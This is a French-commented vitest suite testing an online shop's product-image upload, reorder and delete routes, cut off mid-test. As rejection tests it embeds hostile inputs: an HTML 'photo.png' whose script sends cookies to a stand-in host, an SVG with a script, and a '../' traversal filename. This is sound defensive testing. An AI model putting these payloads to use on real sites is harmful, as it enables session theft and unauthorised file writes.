import { existsSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, rmSync, statSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";

import { NextRequest } from "next/server";
import { afterAll, beforeAll, beforeEach, describe, expect, it } from "vitest";

import {
  DELETE as deleteImage,
  PATCH as patchImage,
} from "@/app/api/admin/products/[id]/images/[imageId]/route";
import {
  GET as listImages,
  POST as uploadImage,
} from "@/app/api/admin/products/[id]/images/route";
import { readImageOrientation, sanitizeImage, sniffImageMime } from "@/domain/image-format";
import { newId } from "@/lib/ids";
import { loadCatalog } from "@/server/catalog";
import { MAX_IMAGE_PIXELS, MAX_IMAGES_PER_PRODUCT, MAX_UPLOAD_BYTES } from "@/server/product-images";

import { buildJpeg, buildPng, buildWebp } from "../helpers/image-fixtures";
import { prismaTest, resetDb, seedFixtures } from "../helpers/prisma-test";

/**
 * Téléversement, réordonnancement et suppression des visuels produits
 * (chantier H, lot 2C).
 *
 * Ces tests passent par les VRAIES routes API, avec de VRAIS fichiers, et
 * vérifient AUSSI l'état du disque — pas seulement celui de la base. Un test
 * qui ne regarde que la base laisserait passer précisément les deux défauts
 * les plus coûteux de ce chantier : le fichier écrit hors du répertoire prévu,
 * et le fichier orphelin qu'on oublie de supprimer.
 *
 * Les fichiers téléversés vont dans un répertoire TEMPORAIRE (`UPLOADS_DIR`) :
 * la suite ne laisse rien derrière elle dans `public/`.
 */

let uploadRoot = "";
let previousUploadsDir: string | undefined;
let previousQuota: string | undefined;
let fixtures: Awaited<ReturnType<typeof seedFixtures>>;
let productId = "";

beforeAll(() => {
  previousUploadsDir = process.env.UPLOADS_DIR;
  previousQuota = process.env.QUOTA_UPLOADS_MB;
  uploadRoot = mkdtempSync(path.join(tmpdir(), "shop-uploads-test-"));
  mkdirSync(uploadRoot, { recursive: true });
  process.env.UPLOADS_DIR = uploadRoot;
});

afterAll(async () => {
  await prismaTest.$disconnect();
  // Nettoyage : aucun faux téléversement ne doit subsister, ni sous `public/`,
  // ni dans le répertoire temporaire.
  rmSync(uploadRoot, { recursive: true, force: true });
  if (previousUploadsDir === undefined) delete process.env.UPLOADS_DIR;
  else process.env.UPLOADS_DIR = previousUploadsDir;
  if (previousQuota === undefined) delete process.env.QUOTA_UPLOADS_MB;
  else process.env.QUOTA_UPLOADS_MB = previousQuota;
});

beforeEach(async () => {
  await resetDb();
  fixtures = await seedFixtures();
  productId = fixtures.products["t-shirt-basique-blanc"]!.id;
  delete process.env.QUOTA_UPLOADS_MB;
  // On repart d'un répertoire vide pour que les assertions sur le disque
  // portent sur le seul téléversement du test en cours.
  rmSync(uploadRoot, { recursive: true, force: true });
  mkdirSync(uploadRoot, { recursive: true });
});

// ─────────────────────────────────────────────────────────────────────
// Fabriques de requêtes
// ─────────────────────────────────────────────────────────────────────

async function adminToken(): Promise<string> {
  const admin = await prismaTest.user.findUniqueOrThrow({ where: { email: "admin@shop.local" } });
  return createSession(admin.id);
}

async function createSession(userId: string): Promise<string> {
  const token = newId();
  await prismaTest.session.create({
    data: { token, userId, expiresAt: new Date(Date.now() + 3_600_000) },
  });
  return token;
}

/** Session d'un compte STAFF — qui n'a PAS la capacité `products:write`. */
async function staffToken(): Promise<string> {
  const staff = await prismaTest.user.create({
    data: { email: `staff-${newId()}@shop.local`, passwordHash: "x", role: "STAFF" },
  });
  return createSession(staff.id);
}

function uploadRequest(options: {
  token?: string;
  bytes?: Uint8Array;
  fileName?: string;
  /** Content-Type ANNONCÉ par le client : le serveur ne doit pas s'y fier. */
  declaredType?: string;
  alt?: string | null;
  declaredContentLength?: string;
}): NextRequest {
  const url = `http://localhost:3000/api/admin/products/${productId}/images`;

  if (options.declaredContentLength !== undefined) {
    // Requête sans corps, uniquement pour tester le refus PRÉCOCE sur la
    // taille annoncée (avant toute mise en mémoire).
    return new NextRequest(url, {
      method: "POST",
      headers: {
        ...(options.token ? { cookie: `admin_session=${options.token}` } : {}),
        "content-length": options.declaredContentLength,
      },
    });
  }

  const form = new FormData();
  if (options.bytes) {
    form.set(
      "file",
      new File([options.bytes], options.fileName ?? "photo.png", {
        type: options.declaredType ?? "image/png",
      }),
    );
  }
  if (options.alt !== null) form.set("alt", options.alt ?? "T-shirt blanc, vu de face");

  return new NextRequest(url, {
    method: "POST",
    headers: options.token ? { cookie: `admin_session=${options.token}` } : {},
    body: form,
  });
}

function patchRequest(token: string | undefined, body: unknown): NextRequest {
  return new NextRequest(`http://localhost:3000/api/admin/products/${productId}/images/x`, {
    method: "PATCH",
    headers: {
      "content-type": "application/json",
      ...(token ? { cookie: `admin_session=${token}` } : {}),
    },
    body: JSON.stringify(body),
  });
}

function deleteRequest(token: string | undefined, imageId: string): NextRequest {
  return new NextRequest(
    `http://localhost:3000/api/admin/products/${productId}/images/${imageId}`,
    {
      method: "DELETE",
      headers: token ? { cookie: `admin_session=${token}` } : {},
    },
  );
}

/** Noms des fichiers réellement présents dans le répertoire de téléversement. */
function filesOnDisk(): string[] {
  try {
    return readdirSync(uploadRoot).sort();
  } catch {
    return [];
  }
}

async function uploadPng(token: string, alt = "T-shirt blanc, vu de face", size = { width: 64, height: 48 }) {
  return uploadImage(uploadRequest({ token, bytes: buildPng(size), alt }), {
    params: { id: productId },
  });
}

// ─────────────────────────────────────────────────────────────────────
// Autorisation
// ─────────────────────────────────────────────────────────────────────

describe("autorisation du téléversement", () => {
  it("refuse un téléversement sans session et n'écrit ni ligne ni fichier", async () => {
    const res = await uploadImage(uploadRequest({ bytes: buildPng({ width: 64, height: 64 }) }), {
      params: { id: productId },
    });
    expect(res.status).toBe(401);
    expect(await prismaTest.productImage.count()).toBe(0);
    expect(filesOnDisk()).toEqual([]);
  });

  it("refuse un compte STAFF : la capacité products:write est réservée à ADMIN", async () => {
    // Le refus doit venir de la MATRICE DE CAPACITÉS (CONVENTIONS §13), pas
    // d'un `if (role === "ADMIN")` : ce test échouerait si quelqu'un
    // remplaçait la capacité par un test de rôle en dur sur un autre rôle.
    const token = await staffToken();
    const res = await uploadImage(uploadRequest({ token, bytes: buildPng({ width: 64, height: 64 }) }), {
      params: { id: productId },
    });
    expect(res.status).toBe(403);
    expect(await prismaTest.productImage.count()).toBe(0);
  });
});

// ─────────────────────────────────────────────────────────────────────
// Téléversement
// ─────────────────────────────────────────────────────────────────────

describe("téléversement d'une photo", () => {
  it("accepte un vrai PNG et enregistre type, dimensions et taille", async () => {
    const token = await adminToken();
    const bytes = buildPng({ width: 640, height: 480 });

    const res = await uploadPng(token, "T-shirt blanc de face", { width: 640, height: 480 });
    expect(res.status).toBe(201);
    const payload = (await res.json()) as {
      image: { url: string; alt: string; position: number; width: number; height: number; mimeType: string; sizeBytes: number };
    };

    // Dimensions RÉELLES, celles qui permettront de réserver la place au rendu
    // (critique en 3G : sans elles, la page saute à chaque image).
    expect(payload.image.width).toBe(640);
    expect(payload.image.height).toBe(480);
    expect(payload.image.mimeType).toBe("image/png");
    expect(payload.image.alt).toBe("T-shirt blanc de face");
    expect(payload.image.position).toBe(0);
    expect(payload.image.sizeBytes).toBeGreaterThan(0);

    // Nom GÉNÉRÉ : identifiant + extension déduite du type détecté.
    expect(payload.image.url).toMatch(/^\/uploads\/products\/[a-z0-9]+\.png$/);

    // La ligne existe en base…
    const row = await prismaTest.productImage.findFirstOrThrow({ where: { productId } });
    expect(row.width).toBe(640);
    expect(row.mimeType).toBe("image/png");
    expect(row.sizeBytes).toBe(payload.image.sizeBytes);

    // …et le FICHIER existe sur le disque, avec le contenu assaini (donc pas
    // les octets reçus tels quels).
    const fileName = payload.image.url.split("/").pop()!;
    const absolute = path.join(uploadRoot, fileName);
    expect(existsSync(absolute)).toBe(true);
    const onDisk = new Uint8Array(readFileSync(absolute));
    expect(onDisk.length).toBe(payload.image.sizeBytes);
    expect(Buffer.from(onDisk).equals(Buffer.from(sanitizeImage(bytes, "image/png")))).toBe(true);
    // Un vrai décodeur relit l'image écrite : signature et dimensions intactes.
    expect(sniffImageMime(onDisk)).toBe("image/png");
  });

  it("REFUSE un fichier nommé .png dont le contenu n'est pas une image", async () => {
    // Le test le plus important du chantier : c'est lui qui prouve que la
    // décision est prise sur les OCTETS et pas sur l'extension ni sur le
    // Content-Type annoncé. Un client peut écrire
    //   -F "file=@payload.html;filename=photo.png;type=image/png"
    // et les deux champs menteurs sont parfaitement légaux côté HTTP.
    const token = await adminToken();
    const disguised = new TextEncoder().encode(
      "<html><body><script>document.location='https://exemple.test/vol?c='+document.cookie</script></body></html>",
    );

    const res = await uploadImage(
      uploadRequest({ token, bytes: disguised, fileName: "photo.png", declaredType: "image/png" }),
      { params: { id: productId } },
    );

    expect(res.status).toBe(415);
    const payload = (await res.json()) as { code: string };
    expect(payload.code).toBe("TYPE_NON_SUPPORTE");
    expect(await prismaTest.productImage.count()).toBe(0);
    expect(filesOnDisk()).toEqual([]);
  });

  it("REFUSE un SVG, même renommé en .png, avec un message qui explique pourquoi", async () => {
    const token = await adminToken();
    const svg = new TextEncoder().encode(
      '<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100"><script>alert(1)</script></svg>',
    );

    const res = await uploadImage(
      uploadRequest({ token, bytes: svg, fileName: "photo.png", declaredType: "image/png" }),
      { params: { id: productId } },
    );

    expect(res.status).toBe(415);
    const payload = (await res.json()) as { error: string };
    // Le refus est explicite : la marchande doit comprendre qu'on lui demande
    // une photo, pas un dessin vectoriel.
    expect(payload.error).toContain("SVG");
    expect(filesOnDisk()).toEqual([]);
  });

  it("REFUSE une photo sans description (alt) — un visuel sans texte est inaccessible", async () => {
    const token = await adminToken();
    const res = await uploadImage(
      uploadRequest({ token, bytes: buildPng({ width: 64, height: 64 }), alt: null }),
      { params: { id: productId } },
    );

    expect(res.status).toBe(400);
    const payload = (await res.json()) as { code: string; error: string };
    expect(payload.code).toBe("ALT_MANQUANT");
    expect(payload.error).toContain("obligatoire");
    expect(await prismaTest.productImage.count()).toBe(0);
    expect(filesOnDisk()).toEqual([]);
  });

  it("REFUSE une description réduite à des espaces", async () => {
    const token = await adminToken();
    const res = await uploadImage(
      uploadRequest({ token, bytes: buildPng({ width: 64, height: 64 }), alt: "   " }),
      { params: { id: productId } },
    );
    expect(res.status).toBe(400);
    expect(await prismaTest.productImage.count()).toBe(0);
  });

  it("REFUSE un fichier de plus de 5 Mo (octets réellement reçus)", async () => {
    const token = await adminToken();
    // Un vrai dépassement : les contrôles portent sur le contenu reçu, pas
    // seulement sur la taille annoncée par le client.
    const tooBig = new Uint8Array(MAX_UPLOAD_BYTES + 1);
    tooBig.set(buildPng({ width: 64, height: 64, headerOnly: true }), 0);

    const res = await uploadImage(uploadRequest({ token, bytes: tooBig }), {
      params: { id: productId },
    });

    expect(res.status).toBe(413);
    const payload = (await res.json()) as { code: string };
    expect(payload.code).toBe("TAILLE_DEPASSEE");
    expect(await prismaTest.productImage.count()).toBe(0);
    expect(filesOnDisk()).toEqual([]);
  });

  it("refuse AVANT lecture quand le client annonce une taille énorme", async () => {
    // Refus précoce : sans lui, le corps de la requête serait mis en mémoire
    // avant tout contrôle — c'est le déni de service par remplissage mémoire
    // que le risque R6 décrit.
    const token = await adminToken();
    const res = await uploadImage(
      uploadRequest({ token, declaredContentLength: String(200 * 1024 * 1024) }),
      { params: { id: productId } },
    );
    expect(res.status).toBe(413);
    const payload = (await res.json()) as { code: string };
    expect(payload.code).toBe("TAILLE_DEPASSEE");
  });

  it("se fie au CONTENU, pas au Content-Type annoncé (JPEG annoncé image/png)", async () => {
    const token = await adminToken();
    const jpeg = buildJpeg({ width: 200, height: 100, orientation: 1 });

    const res = await uploadImage(
      uploadRequest({ token, bytes: jpeg, fileName: "photo.png", declaredType: "image/png" }),
      { params: { id: productId } },
    );

    expect(res.status).toBe(201);
    const payload = (await res.json()) as { image: { mimeType: string; url: string } };
    // Le type retenu est celui des octets : JPEG, et l'extension du fichier
    // généré suit ce type — jamais le nom annoncé par le client.
    expect(payload.image.mimeType).toBe("image/jpeg");
    expect(payload.image.url).toMatch(/\.jpg$/);
  });

  it("un nom de fichier client contenant ../ n'écrit RIEN hors du répertoire prévu", async () => {
    const token = await adminToken();
    // Le répertoire d'upload est créé par `mkdtempSync` dans /tmp : compter
    // les entrées de SON PARENT ne mesure rien de fiable — n'importe quel autre
    // programme (ou un test voisin) y dépose un fichier pendant l'exécution, et
    // l'assertion échoue pour 1 octet de différence sans qu'aucune traversée
    // n'ait eu lieu. On mesure donc la seule chose qui compte : ce qui
    // apparaît DANS le dossier d'upload, et l'absence du fichier hors de lui.
    const res = await uploadImage(
      uploadRequest({
        token,
        bytes: buildPng({ width: 64, height: 64 }),
        fileName: "../../../../../../tmp/escamotage.png",
      }),
      { params: { id: productId } },
    );

    expect(res.status).toBe(201);
    const payload = (await res.json()) as { image: { url: string } };

    // Le nom stocké est entièrement généré : ni « .. », ni séparateur.
    const fileName = payload.image.url.split("/").pop()!;
    expect(fileName).toMatch(/^[a-z0-9]+\.[a-z]+$/);
    expect(fileName).not.toContain("..");
    expect(fileName).not.toContain("/");

    // Un seul fichier écrit, et il est DANS le répertoire prévu.
    expect(filesOnDisk()).toEqual([fileName]);
    // LA preuve de non-traversée : le fichier visé par le `../` n'existe pas là
    // où le chemin malveillant le destinait. C'est le contrôle direct, celui
    // qui échouerait si la traversée fonctionnait — contrairement à un
    // comptage d'entrées de répertoire, qui dépend de l'environnement.
    expect(existsSync("/tmp/escamotage.png")).toBe(false);
    // Et le fichier écrit porte bien un nom engendré, donc inoffensif.
    expect(readdirSync(uploadRoot)).toEqual([fileName]);
  });

  it("refuse une image trop petite pour être lisible dans le catalogue", async () => {
    const token = await adminToken();
    const res = await uploadPng(token, "Miniature inutilisable", { width: 16, height: 16 });
    expect(res.status).toBe(400);
    const payload = (await res.json()) as { code: string };
    expect(payload.code).toBe("DIMENSIONS_INSUFFISANTES");
    expect(filesOnDisk()).toEqual([]);
  });

  it("refuse une bombe de décompression sur la seule lecture de l'en-tête", async () => {
    // 60 000 × 60 000 pixels pour un fichier de moins de 200 octets. Le refus
    // doit tomber sur l'en-tête, sans jamais tenter de décoder les pixels.
    const token = await adminToken();
    const bomb = buildPng({ width: 60_000, height: 60_000, headerOnly: true });
    expect(bomb.length).toBeLessThan(200);

    const res = await uploadImage(uploadRequest({ token, bytes: bomb }), {
      params: { id: productId },
    });

    expect(res.status).toBe(413);
    const payload = (await res.json()) as { code: string };
    expect(payload.code).toBe("DIMENSIONS_EXCESSIVES");
    expect(MAX_IMAGE_PIXELS).toBeLessThan(60_000 * 60_000);
    expect(filesOnDisk()).toEqual([]);
  });

  it("conserve l'orientation EXIF mais jette le reste des métadonnées", async () => {
    // Une photo prise au téléphone en portrait porte sa rotation dans l'EXIF ;
    // la jeter ferait afficher toutes les photos couchées. Les coordonnées GPS,
    // elles, n'ont rien à faire sur une fiche produit publique.
    const token = await adminToken();
    const portrait = buildJpeg({
      width: 400,
      height: 600,
      orientation: 6,
      description: "GPS 48.8566,2.3522 - domicile",
      comment: "Telephone de Fatou",
    });

    const res = await uploadImage(
      uploadRequest({ token, bytes: portrait, fileName: "portrait.jpeg", declaredType: "image/jpeg" }),
      { params: { id: productId } },
    );
    expect(res.status).toBe(201);

    const payload = (await res.json()) as { image: { url: string; width: number; height: number } };
    expect(payload.image.width).toBe(400);
    expect(payload.image.height).toBe(600);

    const onDisk = new Uint8Array(
      readFileSync(path.join(uploadRoot, payload.image.url.split("/").pop()!)),
    );
    expect(readImageOrientation(onDisk, "image/jpeg")).toBe(6);
    expect(Buffer.from(onDisk).includes("GPS 48.8566")).toBe(false);
    expect(Buffer.from(onDisk).includes("Telephone de Fatou")).toBe(false);
  });

  it("accepte un WebP et jette ses métadonnées", async () => {
    const token = await adminToken();
    const webp = buildWebp({ width: 300, height: 300, orientation: 1, withXmp: true });

    const res = await uploadImage(
      uploadRequest({ token, bytes: webp, fileName: "photo.webp", declaredType: "image/webp" }),
      { params: { id: productId } },
    );

    expect(res.status).toBe(201);
    const payload = (await res.json()) as { image: { mimeType: string; url: string } };
    expect(payload.image.mimeType).toBe("image/webp");
    const onDisk = new Uint8Array(readFileSync(path.join(uploadRoot, payload.image.url.split("/").pop()!)));
    expect(Buffer.from(onDisk).includes("donnees xmp")).toBe(false);
  });

  it("refuse au-delà de 6 visuels par produit", async () => {
    const token = await adminToken();
    for (let index = 0; index < MAX_IMAGES_PER_PRODUCT; index += 1) {
      const res = await uploadPng(token, `Vue numéro ${index + 1}`);
      expect(res.status).toBe(201);
    }
    expect(await prismaTest.productImage.count({ where: { productId } })).toBe(
      MAX_IMAGES_PER_PRODUCT,
    );

    const overflow = await uploadPng(token, "Une de trop");
    expect(overflow.status).toBe(409);
    const payload = (await overflow.json()) as { code: string; error: string };
    expect(payload.code).toBe("LIMITE_VISUELS");
    // Message actionnable, pas un code d'erreur technique.
    expect(payload.error).toContain("Supprimez une photo");
    expect(filesOnDisk()).toHaveLength(MAX_IMAGES_PER_PRODUCT);
  });

  it("refuse quand le quota de stockage est atteint, avec un message actionnable", async () => {
    process.env.QUOTA_UPLOADS_MB = "1";
    const token = await adminToken();
    // Deux visuels fictifs de 700 ko : la boutique est déjà au-dessus du Mo
    // autorisé. C'est l'état qu'on veut tester, pas la taille du fichier.
    for (let index = 0; index < 2; index += 1) {
      await prismaTest.productImage.create({
        data: {
          productId,
          url: `/uploads/products/ancien-${index}.jpg`,
          alt: "Visuel antérieur",
          position: index,
          mimeType: "image/jpeg",
          sizeBytes: 700 * 1024,
        },
      });
    }

    const res = await uploadPng(token, "Nouvelle photo");
    expect(res.status).toBe(507);
    const payload = (await res.json()) as { code: string; error: string };
    expect(payload.code).toBe("QUOTA_DEPASSE");
    expect(payload.error).toContain("QUOTA_UPLOADS_MB");
    // Rien n'a été écrit : le quota se vérifie AVANT l'écriture disque.
    expect(filesOnDisk()).toEqual([]);
    expect(await prismaTest.productImage.count({ where: { productId } })).toBe(2);
  });

  it("refuse un produit inexistant", async () => {
    const token = await adminToken();
    const res = await uploadImage(
      uploadRequest({ token, bytes: buildPng({ width: 64, height: 64 }) }),
      { params: { id: "produit-inexistant" } },
    );
    expect(res.status).toBe(404);
  });

  it("journalise le téléversement dans le journal d'audit", async () => {
    const token = await adminToken();
    await uploadPng(token, "T-shirt blanc de face");

    const logs = await prismaTest.auditLog.findMany();
    expect(logs).toHaveLength(1);
    expect(logs[0]!.action).toBe("product.image.upload");
    expect(logs[0]!.entity).toBe("ProductImage");
    expect(logs[0]!.userId).toBeTruthy();
  });
});

// ─────────────────────────────────────────────────────────────────────
// Lecture
// ─────────────────────────────────────────────────────────────────────

describe("liste des visuels", () => {
  it("renvoie les visuels dans l'ordre d'affichage et l'état du quota", async () => {
    const token = await adminToken();
    await uploadPng(token, "Première vue");
    await uploadPng(token, "Deuxième vue");

    const res = await listImages(
      new NextRequest(`http://localhost:3000/api/admin/products/${productId}/images`, {
        headers: { cookie: `admin_session=${token}` },
      }),
      { params: { id: productId } },
    );

    expect(res.status).toBe(200);
    const payload = (await res.json()) as {
      images: Array<{ alt: string; position: number; isCover: boolean }>;
      usage: { usedBytes: number; quotaBytes: number; fileCount: number };
    };
    expect(payload.images.map((image) => image.alt)).toEqual(["Première vue", "Deuxième vue"]);
    expect(payload.images.map((image) => image.position)).toEqual([0, 1]);
    expect(payload.images[0]!.isCover).toBe(true);
    expect(payload.images[1]!.isCover).toBe(false);
    // Le quota est affiché dans l'administration : c'est ce qui évite le
    // remplissage de disque silencieux.
    expect(payload.usage.usedBytes).toBeGreaterThan(0);
    expect(payload.usage.quotaBytes).toBe(500 * 1024 * 1024);
    expect(payload.usage.fileCount).toBe(2);
  });
});

// ─────────────────────────────────────────────────────────────────────
// Réordonnancement
// ─────────────────────────────────────────────────────────────────────

describe("réordonnancement des visuels", () => {
  async function threeImages(token: string): Promise<string[]> {
    const ids: string[] = [];
    for (const alt of ["Photo A", "Photo B", "Photo C"]) {
      const res = await uploadPng(token, alt);
      const payload = (await res.json()) as { image: { id: string } };
      ids.push(payload.image.id);
    }
    return ids;
  }

  async function currentOrder(): Promise<Array<{ id: string; position: number }>> {
    return prismaTest.productImage.findMany({
      where: { productId },
      orderBy: { position: "asc" },
      select: { id: true, position: true },
    });
  }

  it("monte un visuel d'un rang sans jamais violer l'unicité des positions", async () => {
    const token = await adminToken();
    const [first, second, third] = (await threeImages(token)) as [string, string, string];

    const res = await patchImage(patchRequest(token, { op: "up" }), {
      params: { id: productId, imageId: second },
    });
    expect(res.status).toBe(200);

    const order = await currentOrder();
    expect(order.map((row) => row.id)).toEqual([second, first, third]);
    // Rangs compacts et uniques : c'est exactement ce que la contrainte
    // `@@unique([productId, position])` exige.
    expect(order.map((row) => row.position)).toEqual([0, 1, 2]);
  });

  it("descend un visuel et laisse les rangs compacts", async () => {
    const token = await adminToken();
    const [first, second, third] = (await threeImages(token)) as [string, string, string];

    await patchImage(patchRequest(token, { op: "down" }), {
      params: { id: productId, imageId: first },
    });

    const order = await currentOrder();
    expect(order.map((row) => row.id)).toEqual([second, first, third]);
    expect(order.map((row) => row.position)).toEqual([0, 1, 2]);
  });

  it("remonte le dernier en photo principale", async () => {
    const token = await adminToken();
    const [first, second, third] = (await threeImages(token)) as [string, string, string];

    const res = await patchImage(patchRequest(token, { op: "cover" }), {
      params: { id: productId, imageId: third },
    });
    expect(res.status).toBe(200);
    const payload = (await res.json()) as { images: Array<{ id: string; isCover: boolean }> };
    expect(payload.images.map((image) => image.id)).toEqual([third, first, second]);
    expect(payload.images[0]!.isCover).toBe(true);

    const order = await currentOrder();
    expect(order.map((row) => row.position)).toEqual([0, 1, 2]);
  });

  it("ne fait rien quand le déplacement est impossible (premier vers le haut)", async () => {
    const token = await adminToken();
    const [first, second, third] = (await threeImages(token)) as [string, string, string];

    const res = await patchImage(patchRequest(token, { op: "up" }), {
      params: { id: productId, imageId: first },
    });
    expect(res.status).toBe(200);
    const order = await currentOrder();
    expect(order.map((row) => row.id)).toEqual([first, second, third]);
    expect(order.map((row) => row.position)).toEqual([0, 1, 2]);
  });

  it("enchaîne les déplacements sans jamais laisser deux visuels au même rang", async () => {
    const token = await adminToken();
    const ids = await threeImages(token);

    const moves = ["up", "down", "cover", "down", "up", "cover", "up"] as const;
    for (const [index, move] of moves.entries()) {
      const target = ids[index % ids.length]!;
      const res = await patchImage(patchRequest(token, { op: move }), {
        params: { id: productId, imageId: target },
      });
      expect(res.status).toBe(200);

      const order = await currentOrder();
      const positions = order.map((row) => row.position);
      expect(new Set(positions).size).toBe(positions.length);
      expect([...positions].sort((a, b) => a - b)).toEqual([0, 1, 2]);
      expect(order).toHaveLength(3);
    }
  });

  it("la contrainte d'unicité existe bel et bien en base (elle n'est pas contournée)", async () => {
    // Preuve que le test précédent a un sens : si la contrainte n'existait pas,
    // il passerait pour de mauvaises raisons.
    const token = await adminToken();
    await threeImages(token);
    await expect(
      prismaTest.productImage.create({
        data: { productId, url: "/uploads/products/doublon.png", alt: "Doublon", position: 0 },
      }),
    ).rejects.toThrow();
  });

  it("modifie la description d'un visuel et refuse une description vide", async () => {
    const token = await adminToken();
    const [first] = (await threeImages(token)) as [string];

    const ok = await patchImage(patchRequest(token, { op: "alt", alt: "Vue de dos" }), {
      params: { id: productId, imageId: first },
    });
    expect(ok.status).toBe(200);
    const row = await prismaTest.productImage.findUniqueOrThrow({ where: { id: first } });
    expect(row.alt).toBe("Vue de dos");

    const refused = await patchImage(patchRequest(token, { op: "alt", alt: "  " }), {
      params: { id: productId, imageId: first },
    });
    expect(refused.status).toBe(400);
    const stillThere = await prismaTest.productImage.findUniqueOrThrow({ where: { id: first } });
    expect(stillThere.alt).toBe("Vue de dos");
  });

  it("refuse une action inconnue et un visuel d'un autre produit", async () => {
    const token = await adminToken();
    const [first] = (await threeImages(token)) as [string];

    const badAction = await patchImage(patchRequest(token, { op: "pivoter" }), {
      params: { id: productId, imageId: first },
    });
    expect(badAction.status).toBe(400);

    const otherProduct = fixtures.products["sac-tote-canvas"]!.id;
    const wrongProduct = await patchImage(patchRequest(token, { op: "up" }), {
      params: { id: otherProduct, imageId: first },
    });
    expect(wrongProduct.status).toBe(404);
  });

  it("journalise les réordonnancements", async () => {
    const token = await adminToken();
    const [first] = (await threeImages(token)) as [string];
    await patchImage(patchRequest(token, { op: "cover" }), {
      params: { id: productId, imageId: first },
    });
    const logs = await prismaTest.auditLog.findMany({ where: { action: "product.image.reorder" } });
    expect(logs.length).toBeGreaterThanOrEqual(1);
  });
});

// ─────────────────────────────────────────────────────────────────────
// Suppression
// ─────────────────────────────────────────────────────────────────────

describe("suppression d'un visuel", () => {
  it("supprime la ligne ET le fichier, puis compacte les rangs", async () => {
    const token = await adminToken();
    const ids: string[] = [];
    for (const alt of ["A", "B", "C"]) {
      const res = await uploadPng(token, alt);
      ids.push(((await res.json()) as { image: { id: string } }).image.id);
    }
    expect(filesOnDisk()).toHaveLength(3);

    const [, middle] = ids as [string, string, string];
    const res = await deleteImage(deleteRequest(token, middle), {
      params: { id: productId, imageId: middle },
    });
    expect(res.status).toBe(200);

    // La ligne a disparu…
    expect(await prismaTest.productImage.count({ where: { productId } })).toBe(2);
    expect(await prismaTest.productImage.findUnique({ where: { id: middle } })).toBeNull();

    // …le FICHIER aussi (sinon le disque se remplit d'orphelins)…
    expect(filesOnDisk()).toHaveLength(2);

    // …et les rangs restants sont recollés, sans trou.
    const remaining = await prismaTest.productImage.findMany({
      where: { productId },
      orderBy: { position: "asc" },
      select: { position: true },
    });
    expect(remaining.map((row) => row.position)).toEqual([0, 1]);

    const payload = (await res.json()) as { images: Array<{ position: number; isCover: boolean }> };
    expect(payload.images.map((image) => image.position)).toEqual([0, 1]);
    expect(payload.images[0]!.isCover).toBe(true);
  });

  it("supprime la photo principale et promeut la suivante", async () => {
    const token = await adminToken();
    const ids: string[] = [];
    for (const alt of ["A", "B"]) {
      const res = await uploadPng(token, alt);
      ids.push(((await res.json()) as { image: { id: string } }).image.id);
    }

    await deleteImage(deleteRequest(token, ids[0]!), {
      params: { id: productId, imageId: ids[0]! },
    });

    const cover = await prismaTest.productImage.findFirstOrThrow({
      where: { productId, position: 0 },
    });
    expect(cover.id).toBe(ids[1]);
  });

  it("ne supprime PAS le fichier s'il est encore référencé ailleurs", async () => {
    // Cas rare mais destructeur : deux lignes peuvent pointer sur la même URL.
    // Supprimer le fichier afficherait une image cassée sur l'autre produit.
    const token = await adminToken();
    const res = await uploadPng(token, "Photo partagée");
    const created = ((await res.json()) as { image: { id: string; url: string } }).image;
    const fileName = created.url.split("/").pop()!;

    const otherProduct = fixtures.products["sac-tote-canvas"]!.id;
    await prismaTest.productImage.create({
      data: {
        productId: otherProduct,
        url: created.url,
        alt: "Même fichier, autre produit",
        position: 0,
        mimeType: "image/png",
        sizeBytes: 1024,
      },
    });

    await deleteImage(deleteRequest(token, created.id), {
      params: { id: productId, imageId: created.id },
    });

    expect(existsSync(path.join(uploadRoot, fileName))).toBe(true);
    expect(filesOnDisk()).toEqual([fileName]);
  });

  it("supprime tous les visuels et ne laisse aucun fichier derrière", async () => {
    const token = await adminToken();
    const ids: string[] = [];
    for (const alt of ["A", "B", "C"]) {
      const res = await uploadPng(token, alt);
      ids.push(((await res.json()) as { image: { id: string } }).image.id);
    }

    for (const id of ids) {
      const res = await deleteImage(deleteRequest(token, id), {
        params: { id: productId, imageId: id },
      });
      expect(res.status).toBe(200);
    }

    expect(await prismaTest.productImage.count({ where: { productId } })).toBe(0);
    expect(filesOnDisk()).toEqual([]);
    // Le répertoire lui-même reste en place : il est réutilisé au prochain envoi.
    expect(statSync(uploadRoot).isDirectory()).toBe(true);
  });

  it("renvoie 404 pour un visuel inconnu ou appartenant à un autre produit", async () => {
    const token = await adminToken();
    const otherProduct = fixtures.products["sac-tote-canvas"]!.id;

    const unknown = await deleteImage(deleteRequest(token, "visuel-inexistant"), {
      params: { id: productId, imageId: "visuel-inexistant" },
    });
    expect(unknown.status).toBe(404);

    const created = await uploadPng(token, "Chez le premier produit");
    const imageId = ((await created.json()) as { image: { id: string } }).image.id;
    const wrongProduct = await deleteImage(deleteRequest(token, imageId), {
      params: { id: otherProduct, imageId },
    });
    expect(wrongProduct.status).toBe(404);
    expect(filesOnDisk()).toHaveLength(1);
  });

  it("journalise la suppression", async () => {
    const token = await adminToken();
    const res = await uploadPng(token, "À supprimer");
    const imageId = ((await res.json()) as { image: { id: string } }).image.id;
    await deleteImage(deleteRequest(token, imageId), { params: { id: productId, imageId } });

    const logs = await prismaTest.auditLog.findMany({ where: { action: "product.image.delete" } });
    expect(logs).toHaveLength(1);
    expect(logs[0]!.entityId).toBe(imageId);
  });
});

// ─────────────────────────────────────────────────────────────────────
// Rendu public
// ─────────────────────────────────────────────────────────────────────

describe("le visuel de position 0 est celui affiché partout", () => {
  it("le catalogue public renvoie la photo principale", async () => {
    const token = await adminToken();
    const ids: string[] = [];
    for (const alt of ["Vue de face", "Vue de dos", "Détail du col"]) {
      const res = await uploadPng(token, alt);
      ids.push(((await res.json()) as { image: { id: string } }).image.id);
    }

    // Les anciens visuels de démonstration du produit sont retirés : on isole
    // le cas « la boutique a ses propres photos ».
    await prismaTest.productImage.deleteMany({
      where: { productId, id: { notIn: ids } },
    });

    // On promeut la 3ᵉ : l'ordre d'affichage doit suivre, partout.
    await patchImage(patchRequest(token, { op: "cover" }), {
      params: { id: productId, imageId: ids[2]! },
    });

    const coverRow = await prismaTest.productImage.findFirstOrThrow({
      where: { productId, position: 0 },
    });

    // 1) Le catalogue (accueil, /products, /categorie/[slug]) : la grille prend
    //    la position 0 (`take: 1, orderBy position asc` dans `loadCatalog`).
    const catalog = await loadCatalog({ query: "", categorySlug: null, sort: "recents", page: 1 });
